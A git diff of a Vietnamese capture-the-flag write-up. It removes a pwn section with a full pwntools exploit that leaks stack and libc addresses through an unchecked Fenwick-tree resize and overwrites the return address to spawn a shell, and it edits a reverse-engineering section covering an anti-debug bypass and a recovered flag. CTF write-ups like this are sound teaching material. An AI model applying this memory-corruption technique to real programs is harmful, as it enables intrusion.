@@ -2,143 +2,6 @@ Giải này thì em chỉ làm dc 1 bài duy nhất, nma ít ra em cũng đượ
 
 https://www.youtube.com/watch?v=skqylbxAPP4
 
----Is_that_a_ppc_chall?---
-
-![](../../img/2026-1789267941725.webp)
-
-Bài này là một bài cho phép mình thao tác trên Fenwick tree, với 1 thao tác độc lạ là resize cái Fenwick Tree này, và thao tác này không có sanity check
-
-Đi sâu vào từng thao tác:
-
-1. Thao tác update (case 1): Chọn id của phần tử và update từ id đó một giá trị là delta (!) 
-2. Thao tác query (case 2): Tính sum từ id theo thao tác nhảy bit của Fenwick tree (!)
-3. THao tác resize (case 3): Chình lại size của cái Fenwick tree mà không thực hiện thao tác update lại các giá trị của cây
-
-(!) Fenwick Tree và các thao tác trên cây đọc thêm ở đây: https://cp-algorithms.com/data_structures/fenwick.html
-
-![](../../img/2026-1789289073771.webp)
-
-Vì cái Fenwick tree này nó nằm trên stack (qword array s nằm trên stack), nên ta có thể resize cái struct sao cho nó nhận cả return address (cũng nằm trên stack) vào tầm của nó
-
-![](../../img/2026-1789290598311.webp)
-
-Fenwick Tree của ta bắt đầu tại 0x7ffec2c211e0 (được highlight), và return address của ta ở 0x7ffec2c213f8 (một address trong libc_start_main) và ở dưới nó 0x10 byte là một address thuộc về binary
-
-Và vì Fenwick tree nhảy bit để tính tổng (ví dụ phần từ thứ 10 + phần tử thứ 8 + phần tử thứ 0), ta có thể dịch từ từ con trỏ để có thể tính lần lượt các address cần thiết trên stack (vì thao tác query là thao tác tính tổng dạng Fenwick tree, nên ta cần phải biết được một số giá trị trước target để phục hồi target từ sum của thao tác query), bao gồm return address (libc_start_main, một hàm trong libc được gọi trước main), và một exe address (một số hàm init của binary trước main mà mình cũng không rõ)
-
-![](../../img/2026-1789268229498.webp)
-
-![](../../img/2026-1789289250066.webp)
-
-Với address của libc_start_main và address của một hàm nào đó trong binary, ta có thể tính exe_base và libc_base, từ đó tính offset từ return address (libc_start_main) tới hàm win (một hàm trong binary) và dùng thao tác update để chỉnh sửa return address để nhảy vào hàm win và spawn shell (chú ý rsp 0x10 alignment vì khi gọi shell binary sẽ check 16 bytes alignment, ở đây ta cộng một offset 0x27 để tránh một cái push rbp ở đầu function để tránh 0x10 misalignment)
-
-![](../../img/2026-1789290332281.webp)
-
-Một ví dụ về 0x10 misalignment (vì hệ thống 64 bits dùng xmmword, tức một cấu trúc 0x10 bytes, thứ chỉ có thể được lấy tại các địa chỉ align với 0x10)
-
-Lỗi này không xảy ra ở các hệ thống 32 bits
-
-```
-#!/usr/bin/env python3
-
-from pwn import *
-
-exe = ELF("./chall")
-
-context.binary = exe
-context.log_level="info"
-
-script = '''
-    b main
-    # c
-'''
-
-def update(r,idx,w):
-    r.sendlineafter(">","1")
-    payload=flat(
-        str(idx).encode(),
-        " ",
-        str(w).encode()
-    )
-    r.sendlineafter("idx delta:",payload)
-
-def query(r,idx):
-    r.sendlineafter(">","2")
-    r.sendlineafter("idx:",str(idx).encode())
-
-def resize(r,sz):
-    r.sendlineafter(">","3")
-    r.sendlineafter("n:",str(sz).encode())
-
-def conn():
-    if args.LOCAL:
-        r = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r)
-    else:
-        r = remote("127.0.0.1", 1337)
-
-    return r
-
-
-def main():
-    r = conn()
-    # r = gdb.debug(exe.path, gdbscript=script)
-
-    resize(r,100)
-
-    query(r,65)
-
-    r.recvuntil("sum=")
-    data=r.recvline()
-    data=data.split(b'\n')[0]
-    canary=int(data,10)&0xffffffffffffffff
-
-    query(r,66)
-
-    r.recvuntil("sum=")
-    data=r.recvline()
-    data=data.split(b'\n')[0]
-    addr0=int(data,10)&0xffffffffffffffff
-
-    query(r,67)
-    
-    r.recvuntil("sum=")
-    data=r.recvline()
-    data=data.split(b'\n')[0]
-    addr1=int(data,10)&0xffffffffffffffff
-
-    query(r,68)
-    
-    r.recvuntil("sum=")
-    data=r.recvline()
-    data=data.split(b'\n')[0]
-    addr2=int(data,10)&0xffffffffffffffff
-
-    query(r,69)
-    
-    r.recvuntil("sum=")
-    data=r.recvline()
-    data=data.split(b'\n')[0]
-    addr3=int(data,10)&0xffffffffffffffff
-
-    update(r,67,addr3-addr1-0x88+0x27)
-    r.sendlineafter(">","4")
-
-    log.info("canary=0x%lx",canary)
-    log.info("addr0=0x%lx",addr0)
-    log.info("addr1=0x%lx",addr1)
-    log.info("addr2=0x%lx",addr2)
-    log.info("addr3=0x%lx",addr3)
-
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
-
-```
-
 ---is that a rev chall?---
 
 ![](../../img/2026-1789394683019.webp)
@@ -282,36 +145,38 @@ if __name__ == "__main__":
 
 Vì bài này không có server nên là flag nó sẽ nằm trong cái binary luôn
 
-![](../2026-1789400474265.webp)
+![](../../img/2026-1789400474265.webp)
 
-![](../2026-1789400496192.webp)
+![](../../img/2026-1789400496192.webp)
 
 nhìn qua pseudo code trong gdb thì không thấy cái phần nào là checkflag hết, nma có 1 biến v33 được tạo ra thành vùng executable bằng sys_munmap, rồi gọi vào, nên khả năng cao là function check flag
 
-![](../2026-1789401421610.webp)
+![](../../img/2026-1789401421610.webp)
 
-![](../2026-1789401477425.webp)
+![](../../img/2026-1789401477425.webp)
 
 Khi ta kiểm tra, ta thấy input được so sánh với 1 xâu hash với hash key tăng 0x17 sau mỗi lần hash
 
 Nhưng khi ta cố gắng khôi phục flag, xâu ta nhận được lại không viết tay được
 
-![](../2026-1789402739992.webp)
+![](../../img/2026-1789402739992.webp)
 
 debug tiếp, ta thấy process open file và xử lý mà không tương tác với giao diện
 
-![](../2026-1789402826269.webp)
+![](../../img/2026-1789402826269.webp)
 
-![](../2026-1789402960421.webp)
+![](../../img/2026-1789402960421.webp)
 
 nhìn lên phía trên ta có thể thấy tên file đã được hash xor
 
-![](../2026-1789403022390.webp)
+![](../../img/2026-1789403022390.webp)
 
 khi debug trong dbg, ta thấy process open file /pro/self/status, khả năng cao là để check xem file có đang bị trace không
 
 Dùng gdb jump qua đoạn đó, vào lại function check flag, ta thấy một đoạn mã khác
 
-![](./General-1789403164952.webp)
+![](../../img/General-1789403164952.webp)
 
-từ đây ta có thể tìm dc flag ban
+Thử giải mã lại
+
+Flag: W1{th1s_1s_fin4l_flaggg!!!}
